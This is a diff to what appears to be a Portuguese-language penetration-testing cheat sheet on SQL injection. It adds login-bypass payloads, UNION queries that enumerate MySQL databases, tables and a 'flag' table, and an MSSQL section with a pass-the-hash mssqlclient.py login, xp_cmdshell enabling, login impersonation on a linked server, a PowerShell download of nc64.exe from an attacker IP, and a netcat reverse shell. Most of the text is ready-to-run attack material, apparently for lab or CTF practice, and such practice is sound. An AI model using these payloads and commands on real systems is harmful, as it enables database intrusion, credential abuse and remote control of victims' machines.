@@ -69,6 +69,25 @@ Bypasses
 'or 1#
 ' or 1=1 --
 ' or 1=1 -- -
+' or '1'='1'#
+' or 1=1--
+' or true#
+' or ''=''#
+' or id='1'#
+' or true limit 1#
+' or true limit 3,1#
+' OR 1=1 -- //
+0 order by 5
+0 union select 1,2,3
+0 union select 1,3,database()
+0 union select 1,user(),database()
+0 union select 1,version(),database()
+0 union select 1,2,concat(user(),":",version(),":",database())
+0 union select 1,2,schema_name from information_schema.schemata
+0 union select 1,2,table_name from information_schema.columns
+0 union select 1,table_schema,table_name from information_schema.columns
+0 union select 1,table_name,column_name from information_schema.columns where table_schema="tarefa02"
+0 union select 1,2,flag from flag
 ```
 
 Execução de comando:
@@ -81,3 +100,26 @@ sudo mysql -uroot -p123456 -e '\! /bin/sh'
 - https://medium.com/@vikramroot/exploiting-time-based-sql-injections-data-exfiltration-791aa7f0ae87
 - https://github.com/nvanheuverzwijn/curl-blind-sql-injection/blob/master/README.md
 - https://medium.com/@tomnomnom/making-a-blind-sql-injection-a-little-less-blind-428dcb614ba8
+
+
+mssqlclient.py
+
+```shell
+mssqlclient.py dominio/usuário@192.168.X.X -hashes ":ushduashduhuhu32423u4husdu23" -windows-auth
+```
+
+```shell
+EXECUTE AS LOGIN = 'sa';
+EXEC ('sp_configure "show advanced options", 1; reconfigure') 
+EXEC ('sp_configure "xp_cmdshell", 1; reconfigure') 
+EXEC ('xp_cmdshell "hostname&&whoami"') 
+EXEC ('xp_cmdshell "powershell.exe -e encodedHere"') 
+
+EXECUTE('EXEC AS LOGIN = "conta_alvo"; EXEC xp_cmdshell "hostname&&whoami";') AT [alvo02];
+
+EXECUTE('EXEC AS LOGIN = "conta_alvo"; EXEC xp_cmdshell "cmd /c sc query spooler";') AT [alvo02];
+
+EXECUTE('EXEC AS LOGIN = "conta_alvo"; EXEC xp_cmdshell "powershell wget http://192.168.X.X/nc64.exe -o c:\windows\tasks\nc.exe";') AT [alvo02];
+
+EXECUTE('EXEC AS LOGIN = "conta_alvo"; EXEC xp_cmdshell "cmd /c c:\windows\tasks\nc.exe 192.168.X.X 443 -e cmd.exe";') AT [alvo02];
+```
